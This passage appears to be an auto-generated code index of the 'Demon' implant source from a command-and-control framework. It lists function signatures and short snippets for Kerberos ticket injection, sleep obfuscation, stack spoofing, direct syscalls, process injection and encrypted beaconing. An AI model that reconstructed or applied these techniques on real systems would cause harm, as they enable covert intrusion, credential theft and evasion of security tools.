  - `CopyTicketInfo` (function, line 370) `VOID CopyTicketInfo( PTICKET_INFORMATION TicketInfo, PKERB_TICKET_CACHE_INFO_EX Data )`
  - `Ptt` (function, line 398) `BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )`
  - `Purge` (function, line 493) `BOOL Purge( HANDLE hToken, LUID luid )`
  - `Klist` (function, line 584) `PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )`
  - `GetLUID` (function, line 751) `LUID* GetLUID( HANDLE hToken )`
  - `SysNtClose` (function, line 44) `SysNtClose( hProcessSnap );`
  - `MemZero` (function, line 86) `MemZero( winlogon, sizeof( winlogon ) );`
  - `TokenRevSelf` (function, line 204) `TokenRevSelf();`
  - `MemCopy` (function, line 305) `MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );`
  - `StringCopyW` (function, line 352) `StringCopyW( Session->UserSID, sid );`
  - `PUTS` (function, line 432) `PUTS( "[!] Not in high integrity." );`
  - `PRINTF` (function, line 439) `PRINTF( "[!] GetLsaHandle %ld\n", status );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Kerberos.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Memory.c
- Layer: utility
- Doc: include <Demon.h> include <core/Memory.h> include <core/MiniStd.h>  !
- Language: c
- Symbols:
  - `MmHeapAlloc` (function, line 15) `PVOID MmHeapAlloc(
    _In_ ULONG Length
)`
  - `MmHeapReAlloc` (function, line 31) `PVOID MmHeapReAlloc(
    _In_ PVOID Memory,
    _In_ ULONG Length
)`
  - `MmHeapFree` (function, line 48) `BOOL MmHeapFree(
    _In_ PVOID Memory
)`
  - `MmVirtualAlloc` (function, line 62) `PVOID MmVirtualAlloc(
    IN DX_MEMORY Methode,
    IN HANDLE    Process,
    IN SIZE_T    Size,
...`
  - `PUTS` (function, line 79) `case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" )`
  - `MmVirtualProtect` (function, line 133) `BOOL MmVirtualProtect(
    IN DX_MEMORY Method,
    IN HANDLE    Process,
    IN PVOID     Memory...`
  - `PUTS` (function, line 147) `case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" )`
  - `MmVirtualWrite` (function, line 188) `BOOL MmVirtualWrite(
    IN  HANDLE Process,
    OUT PVOID  Memory,
    IN  PVOID  Buffer,
    IN...`
  - `MmVirtualFree` (function, line 209) `BOOL MmVirtualFree(
    IN HANDLE Process,
    IN PVOID  Memory
)`
  - `MmGadgetFind` (function, line 239) `PVOID MmGadgetFind(
    _In_ PVOID  Memory,
    _In_ SIZE_T Length,
    _In_ PVOID  PatternBuffer...`
  - `FreeReflectiveLoader` (function, line 269) `BOOL FreeReflectiveLoader(
    IN PVOID BaseAddress
)`
  - `PackageAddInt32` (function, line 74) `PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );`
  - `PRINTF` (function, line 88) `PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", Process, Size, MEM_RESERVE | MEM_COMMIT, Protect );`
  - `PackageAddPtr` (function, line 114) `PackageAddPtr( Package, Memory );`
  - `PackageTransmit` (function, line 117) `PackageTransmit( Package );`
  - `NtSetLastError` (function, line 162) `NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );`
  - `NT_SUCCESS` (function, line 198) `return NT_SUCCESS( SysNtWriteVirtualMemory( Process, Memory, Buffer, Size, NULL ) );`
  - `C_PTR` (function, line 256) `return C_PTR( U_PTR( Memory ) + Len );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Memory.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/MiniStd.c
- Layer: utility
- Doc: include <Demon.h>  include <core/MiniStd.h>
- Language: c
- Symbols:
  - `StringCompareA` (function, line 8) `INT StringCompareA( LPCSTR String1, LPCSTR String2 )`
  - `StringCompareW` (function, line 20) `INT StringCompareW( LPWSTR String1, LPWSTR String2 )`
  - `StringNCompareW` (function, line 32) `INT StringNCompareW( LPWSTR String1, LPWSTR String2, INT Length )`
  - `ToLowerCaseW` (function, line 47) `WCHAR ToLowerCaseW( WCHAR C )`
  - `StringCompareIW` (function, line 52) `INT StringCompareIW( LPWSTR String1, LPWSTR String2 )`
  - `StringNCompareIW` (function, line 64) `INT StringNCompareIW( LPWSTR String1, LPWSTR String2, INT Length )`
  - `EndsWithIW` (function, line 79) `BOOL EndsWithIW( LPWSTR String, LPWSTR Ending )`
  - `HashStringA` (function, line 100) `DWORD HashStringA( PCHAR String )`
  - `StringCopyA` (function, line 110) `PCHAR StringCopyA(PCHAR String1, PCHAR String2)`
  - `StringCopyW` (function, line 120) `PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)`
  - `StringLengthA` (function, line 129) `SIZE_T StringLengthA(LPCSTR String)`
  - `StringLengthW` (function, line 141) `SIZE_T StringLengthW(LPCWSTR String)`
  - `StringConcatA` (function, line 150) `PCHAR StringConcatA(PCHAR String, PCHAR String2)`
  - `StringConcatW` (function, line 157) `PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)`
  - `WcsStr` (function, line 164) `LPWSTR WcsStr( PWCHAR String, PWCHAR String2 )`
  - `WcsIStr` (function, line 184) `LPWSTR WcsIStr( PWCHAR String, PWCHAR String2 )`
  - `MemCompare` (function, line 204) `INT MemCompare( PVOID s1, PVOID s2, INT len)`
  - `WCharStringToCharString` (function, line 228) `SIZE_T WCharStringToCharString(PCHAR Destination, PWCHAR Source, SIZE_T MaximumAllowed)`
  - `CharStringToWCharString` (function, line 241) `SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )`
  - `StringTokenA` (function, line 254) `PCHAR StringTokenA(PCHAR String, CONST PCHAR Delim)`
  - `GetSystemFileTime` (function, line 299) `UINT64 GetSystemFileTime( )`
  - `HideChar` (function, line 313) `BYTE NO_INLINE HideChar( BYTE C )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/Obf.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Macros.h> include <core/SleepObf.h> include <core/Win32.h> include <core/MiniStd.h> i
- Language: c
- Symbols:
  - `FoliageObf` (function, line 22) `VOID FoliageObf(
    IN PSLEEP_PARAM Param
)`
  - `PRINTF` (function, line 603) `PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */...`
  - `SleepTime` (function, line 649) `UINT32 SleepTime(
    VOID
)`
  - `SleepObf` (function, line 713) `VOID SleepObf(
    VOID
)`
  - `MemCopy` (function, line 117) `MemCopy( RopBegin, RopInit, sizeof( CONTEXT ) );`
  - `SysNtSignalAndWaitForSingleObject` (function, line 236) `SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );`
  - `SysNtClose` (function, line 301) `SysNtClose( hDupObj );`
  - `SysNtTerminateThread` (function, line 306) `SysNtTerminateThread( hThread, STATUS_SUCCESS );`
  - `MemSet` (function, line 314) `MemSet( &Rc4, 0, sizeof( USTRING ) );`
  - `OBF_JMP` (function, line 485) `OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );`
  - `RtlSecureZeroMemory` (function, line 639) `RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );`
  - `SpoofFunc` (function, line 759) `SpoofFunc( Instance->Modules.Kernel32, IMAGE_SIZE( Instance->Modules.Kernel32 ), Instance->Win32.WaitForSingleObjectEx, NtCurrentProcess(), C_PTR( TimeOut ), FALSE );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SleepObf.h`, `payloads/Demon/include/core/Thread.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/ObjectApi.c
- Layer: presentation
- Doc: include <stdio.h> include <stdint.h> include <stdarg.h>  include <Demon.h> include <common/Defines.h> include <core/Comm
- Language: c
- Symbols:
  - `LdrModulePebString` (function, line 20) `PVOID LdrModulePebString( PCHAR ModuleString )`
  - `LdrFunctionAddrString` (function, line 25) `PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )`
  - `LdrFreeLibrary` (function, line 31) `BOOL LdrFreeLibrary( HMODULE hLibModule )`
  - `LdrLocalFree` (function, line 36) `HLOCAL LdrLocalFree( PVOID hMem )`
  - `swap_endianess` (function, line 130) `uint32_t swap_endianess(uint32_t indata)`
  - `BeaconDataParse` (function, line 142) `VOID BeaconDataParse( PDATA parser, PCHAR buffer, INT size )`
  - `BeaconDataInt` (function, line 154) `INT BeaconDataInt( PDATA parser )`
  - `BeaconDataShort` (function, line 169) `SHORT BeaconDataShort( datap* parser )`
  - `BeaconDataLength` (function, line 184) `INT BeaconDataLength( PDATA parser )`
  - `BeaconDataExtract` (function, line 189) `PCHAR BeaconDataExtract( PDATA parser, PINT size )`
  - `GetRequestIDForCallingObjectFile` (function, line 224) `BOOL GetRequestIDForCallingObjectFile( PVOID CoffeeFunctionReturn, PUINT32 RequestID )`
  - `BeaconPrintf` (function, line 247) `VOID BeaconPrintf( INT Type, PCHAR fmt, ... )`
  - `BeaconOutput` (function, line 304) `VOID BeaconOutput( INT Type, PCHAR data, INT len )`
  - `BeaconIsAdmin` (function, line 323) `BOOL BeaconIsAdmin(
    VOID
)`
  - `BeaconFormatAlloc` (function, line 342) `VOID BeaconFormatAlloc( PFORMAT format, int maxsz )`
  - `BeaconFormatReset` (function, line 353) `VOID BeaconFormatReset( PFORMAT format )`
  - `BeaconFormatFree` (function, line 360) `VOID BeaconFormatFree( PFORMAT format )`
  - `BeaconFormatAppend` (function, line 376) `VOID BeaconFormatAppend( PFORMAT format, char* text, int len )`
  - `BeaconFormatPrintf` (function, line 383) `VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )`
  - `BeaconFormatToString` (function, line 404) `char* BeaconFormatToString( PFORMAT format, int* size)`
  - `BeaconFormatInt` (function, line 410) `VOID BeaconFormatInt( PFORMAT format, int value)`
  - `BeaconUseToken` (function, line 424) `BOOL BeaconUseToken( HANDLE token )`
  - `BeaconGetSpawnTo` (function, line 439) `VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )`
  - `BeaconSpawnTemporaryProcess` (function, line 462) `BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMA...`
  - `BeaconInjectProcess` (function, line 486) `VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * a...`
  - `BeaconInjectTemporaryProcess` (function, line 529) `VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_of...`
  - `BeaconCleanupProcess` (function, line 563) `VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )`
  - `BeaconInformation` (function, line 578) `VOID BeaconInformation(BEACON_INFO * info)`
  - `BeaconAddValue` (function, line 583) `BOOL BeaconAddValue(const char * key, void * ptr)`
  - `BeaconGetValue` (function, line 632) `PVOID BeaconGetValue(const char * key)`
  - `BeaconRemoveValue` (function, line 655) `BOOL BeaconRemoveValue(const char * key)`
  - `BeaconDataStoreGetItem` (function, line 690) `PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)`
  - `BeaconDataStoreProtectItem` (function, line 697) `VOID BeaconDataStoreProtectItem(SIZE_T index)`
  - `BeaconDataStoreUnprotectItem` (function, line 704) `VOID BeaconDataStoreUnprotectItem(SIZE_T index)`
  - `BeaconDataStoreMaxEntries` (function, line 711) `SIZE_T BeaconDataStoreMaxEntries()`
  - `BeaconGetCustomUserData` (function, line 718) `PCHAR BeaconGetCustomUserData()`
  - `toWideChar` (function, line 723) `BOOL toWideChar( char* src, wchar_t* dst, int max )`
  - `PRINTF` (function, line 22) `PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) ) return Instance->Win32.GetModuleHandleA( ModuleString );`
  - `MemCopy` (function, line 161) `MemCopy( &Value, parser->buffer, 4 );`
  - `PUTS` (function, line 260) `PUTS( "Format string can't be NULL" );`
  - `va_start` (function, line 268) `va_start( VaListArg, fmt );`
  - `va_end` (function, line 281) `va_end( VaListArg );`
  - `PackageAddInt32` (function, line 296) `PackageAddInt32( package, Type );`
  - `PackageAddBytes` (function, line 298) `PackageAddBytes( package, CallbackOutput, CallbackSize );`
  - `PackageTransmit` (function, line 299) `PackageTransmit( package );`
  - `MemSet` (function, line 300) `MemSet( CallbackOutput, 0, CallbackSize );`
  - `SysNtClose` (function, line 337) `SysNtClose( Token );`
  - `InitializeObjectAttributes` (function, line 495) `InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );`
  - `SysNtCreateThreadEx` (function, line 560) `SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);`
  - `StringCopyA` (function, line 624) `StringCopyA( KeyValue->Key, key );`
  - `DATA_FREE` (function, line 677) `DATA_FREE( Current, sizeof( COFFEE_KEY_VALUE ) );`
  - `bufsize` (macro, line 16) `#define bufsize`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Defines.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Package.c
- Layer: utility
- Doc: Import Core Headers
- Language: c
- Symbols:
  - `Int64ToBuffer` (function, line 12) `VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )`
  - `Int32ToBuffer` (function, line 38) `VOID Int32ToBuffer(
    OUT PUCHAR Buffer,
    IN  UINT32 Size
)`
  - `PackageAddInt32` (function, line 48) `VOID PackageAddInt32(
    _Inout_ PPACKAGE Package,
    IN     UINT32   Data
)`
  - `PackageAddInt64` (function, line 67) `VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )`
  - `PackageAddBool` (function, line 84) `VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    IN     BOOLEAN  Data
)`
  - `PackageAddPtr` (function, line 103) `VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )`
  - `PackageAddPad` (function, line 108) `VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )`
  - `PackageAddBytes` (function, line 124) `VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )`
  - `PackageAddString` (function, line 146) `VOID PackageAddString( PPACKAGE package, PCHAR data )`
  - `PackageAddWString` (function, line 151) `VOID PackageAddWString( PPACKAGE package, PWCHAR data )`
  - `PackageCreate` (function, line 156) `PPACKAGE PackageCreate( UINT32 CommandID )`
  - `PackageCreateWithMetaData` (function, line 173) `PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )`
  - `PackageCreateWithRequestID` (function, line 186) `PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )`
  - `PackageDestroy` (function, line 195) `VOID PackageDestroy(
    IN PPACKAGE Package
)`
  - `PackageTransmitNow` (function, line 229) `BOOL PackageTransmitNow(
    _Inout_ PPACKAGE Package,
    OUT    PVOID*   Response,
    OUT    P...`
  - `PUTS_DONT_SEND` (function, line 264) `PUTS_DONT_SEND("TransportSend failed!")
        }

        if ( Package->Destroy )`
  - `PackageTransmit` (function, line 281) `VOID PackageTransmit(
    IN PPACKAGE Package
)`
  - `PackageTransmitAll` (function, line 333) `BOOL PackageTransmitAll(
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
)`
  - `PackageTransmitError` (function, line 470) `VOID PackageTransmitError(
    IN UINT32 ID,
    IN UINT32 ErrorCode
)`
  - `MemCopy` (function, line 119) `MemCopy( Package->Buffer + ( Package->Length ), Data, Size );`
  - `MemSet` (function, line 217) `MemSet( Package->Buffer, 0, Package->Length );`
  - `AesInit` (function, line 256) `AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );`
  - `AesXCryptBuffer` (function, line 258) `AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );`
  - `PRINTF_DONT_SEND` (function, line 476) `PRINTF_DONT_SEND( "Transmit Error: %d\n", ErrorCode );`
  - `CTR` (macro, line 9) `#define CTR`
  - `AES256` (macro, line 10) `#define AES256`
- Depends on: `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Transport.h`, `payloads/Demon/include/core/TransportSmb.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/Parser.c
- Layer: utility
- Doc: include <Demon.h>  include <core/Parser.h> include <core/MiniStd.h> include <crypt/AesCrypt.h>
- Language: c
- Symbols:
  - `ParserNew` (function, line 6) `VOID ParserNew( PPARSER parser, PBYTE Buffer, UINT32 size )`
  - `ParserDecrypt` (function, line 20) `VOID ParserDecrypt( PPARSER parser, PBYTE Key, PBYTE IV )`
  - `ParserGetInt16` (function, line 31) `INT16 ParserGetInt16( PPARSER parser )`
  - `ParserGetByte` (function, line 47) `BYTE ParserGetByte( PPARSER parser )`
  - `ParserGetInt32` (function, line 62) `INT ParserGetInt32( PPARSER parser )`
  - `ParserGetInt64` (function, line 84) `INT64 ParserGetInt64( PPARSER parser )`
  - `ParserGetBool` (function, line 105) `BOOL ParserGetBool( PPARSER parser )`
  - `ParserGetBytes` (function, line 126) `PBYTE ParserGetBytes( PPARSER parser, PUINT32 size )`
  - `ParserGetString` (function, line 157) `PCHAR  ParserGetString( PPARSER parser, PUINT32 size )`
  - `ParserGetWString` (function, line 162) `PWCHAR  ParserGetWString( PPARSER parser, PUINT32 size )`
  - `ParserDestroy` (function, line 167) `VOID ParserDestroy( PPARSER Parser )`
  - `MemCopy` (function, line 13) `MemCopy( parser->Original, Buffer, size );`
  - `AesInit` (function, line 27) `AesInit( &AesCtx, Key, IV );`
  - `AesXCryptBuffer` (function, line 29) `AesXCryptBuffer( &AesCtx, (PUINT8)parser->Buffer, parser->Length );`
  - `MemSet` (function, line 172) `MemSet( Parser->Original, 0, Parser->Size );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Parser.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/Pivot.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Macros.h>  include <core/Parser.h> include <core/MiniStd.h> include <core/Command.h> 
- Language: c
- Symbols:
  - `PivotAdd` (function, line 23) `BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )`
  - `PivotGet` (function, line 120) `PPIVOT_DATA PivotGet( DWORD AgentID )`
  - `PivotRemove` (function, line 138) `BOOL PivotRemove( DWORD AgentId )`
  - `PivotCount` (function, line 217) `DWORD PivotCount()`
  - `PivotPush` (function, line 234) `VOID PivotPush()`
  - `PivotParseDemonID` (function, line 330) `UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )`
  - `PRINTF` (function, line 28) `PRINTF( "Connecting to named pipe: %ls\n", NamedPipe.Buffer );`
  - `MemSet` (function, line 57) `MemSet( *Output, 0, *BytesSize );`
  - `SysNtClose` (function, line 67) `SysNtClose( Handle );`
  - `MemCopy` (function, line 90) `MemCopy( Data->PipeName.Buffer, NamedPipe.Buffer, NamedPipe.Length );`
  - `PackageAddInt32` (function, line 271) `PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );`
  - `PackageAddBytes` (function, line 272) `PackageAddBytes( Package, Output, BytesSize );`
  - `PackageTransmit` (function, line 273) `PackageTransmit( Package );`
  - `DATA_FREE` (function, line 275) `DATA_FREE( Output, Length );`
  - `ParserNew` (function, line 335) `ParserNew( &Parser, Response, Size );`
  - `ParserGetInt32` (function, line 337) `ParserGetInt32( &Parser );`
  - `ParserDestroy` (function, line 344) `ParserDestroy( &Parser );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Parser.h`

## payloads/Demon/src/core/Runtime.c
- Layer: utility
- Doc: include <Demon.h> include <core/Runtime.h> include <core/MiniStd.h>
- Language: c
- Symbols:
  - `RtAdvapi32` (function, line 4) `BOOL RtAdvapi32(
    VOID
)`
  - `RtMscoree` (function, line 68) `BOOL RtMscoree(
    VOID
)`
  - `RtOleaut32` (function, line 102) `BOOL RtOleaut32(
    VOID
)`
  - `RtUser32` (function, line 141) `BOOL RtUser32(
    VOID
)`
  - `RtShell32` (function, line 175) `BOOL RtShell32(
    VOID
)`
  - `RtMsvcrt` (function, line 207) `BOOL RtMsvcrt(
    VOID
)`
  - `RtIphlpapi` (function, line 239) `BOOL RtIphlpapi(
    VOID
)`
  - `RtGdi32` (function, line 272) `BOOL RtGdi32(
    VOID
)`
  - `RtNetApi32` (function, line 309) `BOOL RtNetApi32(
    VOID
)`
  - `RtWs2_32` (function, line 348) `BOOL RtWs2_32(
    VOID
)`
  - `RtSspicli` (function, line 392) `BOOL RtSspicli(
    VOID
)`
  - `RtAmsi` (function, line 432) `BOOL RtAmsi(
    VOID
)`
  - `RtWinHttp` (function, line 463) `BOOL RtWinHttp(
    VOID
)`
  - `MemZero` (function, line 26) `MemZero( ModuleName, sizeof( ModuleName ) );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Runtime.h`

## payloads/Demon/src/core/Socket.c
- Layer: utility
- Doc: include <Demon.h>  include <core/MiniStd.h>  attempt to receive all the requested data from the socket Took it from: htt
- Language: c
- Symbols:
  - `RecvAll` (function, line 7) `BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )`
  - `InitWSA` (function, line 32) `BOOL InitWSA( VOID )`
  - `PUTS` (function, line 41) `PUTS( "Init Windows Socket..." )

        if ( ( Result = Instance->Win32.WSAStartup( MAKEWORD( 2...`
  - `SocketNew` (function, line 59) `PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PBYTE IPv6, DWORD L...`
  - `PUTS` (function, line 73) `PUTS( "Create Socket..." )

        if ( UseIpv4 )`
  - `PRINTF` (function, line 111) `PRINTF( "SockAddr6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%d\n"...`
  - `SocketClients` (function, line 213) `VOID SocketClients()`
  - `SocketRead` (function, line 281) `VOID SocketRead()`
  - `SocketFree` (function, line 424) `VOID SocketFree( PSOCKET_DATA Socket )`
  - `PRINTF` (function, line 428) `PRINTF( "Closing socket %x\n", Socket->ID )

    /* do we want to remove a reverse port forward c...`
  - `SocketCleanDead` (function, line 481) `VOID SocketCleanDead()`
  - `SocketPush` (function, line 521) `VOID SocketPush()`
  - `DnsQueryIPv4` (function, line 539) `DWORD DnsQueryIPv4( LPSTR Domain )`
  - `DnsQueryIPv6` (function, line 580) `PBYTE DnsQueryIPv6( LPSTR Domain )`
  - `MemCopy` (function, line 108) `MemCopy( &SockAddr6.sin6_addr, IPv6, 16 );`
  - `NtSetLastError` (function, line 206) `NtSetLastError(ErrorCode);`
  - `PackageAddInt32` (function, line 251) `PackageAddInt32( Package, SOCKET_COMMAND_OPEN );`
  - `PackageTransmit` (function, line 263) `PackageTransmit( Package );`
  - `MemSet` (function, line 358) `MemSet( FullData.Buffer, 0, FullData.Length );`
  - `MmHeapFree` (function, line 359) `MmHeapFree( FullData.Buffer );`
  - `PackageAddBytes` (function, line 389) `PackageAddBytes( Package, FullData.Buffer, FullData.Length );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/Spoof.c
- Layer: utility
- Doc: include <core/Spoof.h> include <core/MiniStd.h>  if _WIN64
- Language: c
- Symbols:
  - `SpoofRetAddr` (function, line 5) `PVOID SpoofRetAddr(
    _In_    PVOID  Module,
    _In_    ULONG  Size,
    _In_    HANDLE Functi...`
  - `C_PTR` (function, line 25) `C_PTR( U_PTR( Module ) + LDR_GADGET_HEADER_SIZE ), U_PTR( Size ), Pattern, sizeof( Pattern ) );`
- Depends on: `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Spoof.h`

## payloads/Demon/src/core/SysNative.c
- Layer: utility
- Doc: include <Demon.h>  include <core/Syscalls.h> include <core/SysNative.h>
- Language: c
- Symbols:
  - `SysNtOpenThread` (function, line 5) `NTSTATUS NTAPI SysNtOpenThread(
    OUT    PHANDLE            ThreadHandle,
    IN     ACCESS_MAS...`
  - `SysNtOpenProcess` (function, line 19) `NTSTATUS NTAPI SysNtOpenProcess(
    OUT    PHANDLE             ProcessHandle,
    IN     ACCESS_...`
  - `SysNtTerminateProcess` (function, line 33) `NTSTATUS NTAPI SysNtTerminateProcess(
    IN OPTIONAL HANDLE   ProcessHandle,
    IN          NTS...`
  - `SysNtOpenThreadToken` (function, line 45) `NTSTATUS NTAPI SysNtOpenThreadToken(
    IN  HANDLE      ThreadHandle,
    IN  ACCESS_MASK Desire...`
  - `SysNtOpenProcessToken` (function, line 59) `NTSTATUS NTAPI SysNtOpenProcessToken(
    IN  HANDLE      ProcessHandle,
    IN  ACCESS_MASK Desi...`
  - `SysNtDuplicateToken` (function, line 72) `NTSTATUS NTAPI SysNtDuplicateToken(
    IN  HANDLE             ExistingTokenHandle,
    IN  ACCES...`
  - `SysNtQueueApcThread` (function, line 88) `NTSTATUS NTAPI SysNtQueueApcThread(
    IN     HANDLE          ThreadHandle,
    IN     PPS_APC_R...`
  - `SysNtSuspendThread` (function, line 103) `NTSTATUS NTAPI SysNtSuspendThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSu...`
  - `SysNtResumeThread` (function, line 115) `NTSTATUS NTAPI SysNtResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSus...`
  - `SysNtCreateEvent` (function, line 127) `NTSTATUS NTAPI SysNtCreateEvent (
    OUT    PHANDLE            EventHandle,
    IN     ACCESS_MA...`
  - `SysNtCreateThreadEx` (function, line 142) `NTSTATUS NTAPI SysNtCreateThreadEx(
    OUT PHANDLE     hThread,
    IN  ACCESS_MASK DesiredAcces...`
  - `SysNtDuplicateObject` (function, line 175) `NTSTATUS NTAPI SysNtDuplicateObject(
    IN     HANDLE      SourceProcessHandle,
    IN     HANDL...`
  - `SysNtGetContextThread` (function, line 192) `NTSTATUS NTAPI SysNtGetContextThread (
    IN     HANDLE   ThreadHandle,
    _Inout_ PCONTEXT Thr...`
  - `SysNtSetContextThread` (function, line 204) `NTSTATUS NTAPI SysNtSetContextThread(
    IN HANDLE   ThreadHandle,
    IN PCONTEXT ThreadContext
)`
  - `SysNtQueryInformationProcess` (function, line 216) `NTSTATUS NTAPI SysNtQueryInformationProcess(
    IN      HANDLE           ProcessHandle,
    IN  ...`
  - `SysNtQuerySystemInformation` (function, line 231) `NTSTATUS NTAPI SysNtQuerySystemInformation (
    IN      SYSTEM_INFORMATION_CLASS SystemInformati...`
  - `SysNtWaitForSingleObject` (function, line 245) `NTSTATUS NTAPI SysNtWaitForSingleObject(
    IN     HANDLE         Handle,
    IN     BOOLEAN    ...`
  - `SysNtAllocateVirtualMemory` (function, line 258) `NTSTATUS NTAPI SysNtAllocateVirtualMemory(
    IN     HANDLE    ProcessHandle,
    _Inout_ PVOID*...`
  - `SysNtWriteVirtualMemory` (function, line 274) `NTSTATUS NTAPI SysNtWriteVirtualMemory(
    IN       HANDLE  ProcessHandle,
    IN OPT   PVOID   ...`
  - `SysNtFreeVirtualMemory` (function, line 289) `NTSTATUS NTAPI SysNtFreeVirtualMemory(
    IN     HANDLE  ProcessHandle,
    _Inout_ PVOID*  Base...`
  - `SysNtUnmapViewOfSection` (function, line 303) `NTSTATUS NTAPI SysNtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID  BaseAddress
)`
  - `SysNtProtectVirtualMemory` (function, line 315) `NTSTATUS NTAPI SysNtProtectVirtualMemory(
    IN     HANDLE  ProcessHandle,
    _Inout_ PVOID*  B...`
  - `SysNtReadVirtualMemory` (function, line 330) `NTSTATUS NTAPI SysNtReadVirtualMemory (
    IN      HANDLE  ProcessHandle,
    IN OPT  PVOID   Ba...`
  - `SysNtTerminateThread` (function, line 345) `NTSTATUS NTAPI SysNtTerminateThread (
    IN OPT HANDLE   ThreadHandle,
    IN     NTSTATUS ExitS...`
  - `SysNtAlertResumeThread` (function, line 357) `NTSTATUS NTAPI SysNtAlertResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG Previo...`
  - `SysNtSignalAndWaitForSingleObject` (function, line 369) `NTSTATUS NTAPI SysNtSignalAndWaitForSingleObject(
    IN     HANDLE         SignalHandle,
    IN ...`
  - `SysNtQueryVirtualMemory` (function, line 383) `NTSTATUS NTAPI SysNtQueryVirtualMemory(
    IN      HANDLE                   ProcessHandle,
    I...`
  - `SysNtQueryInformationToken` (function, line 399) `NTSTATUS NTAPI SysNtQueryInformationToken (
    IN  HANDLE                  TokenHandle,
    IN  ...`
  - `SysNtQueryInformationThread` (function, line 414) `NTSTATUS NTAPI SysNtQueryInformationThread(
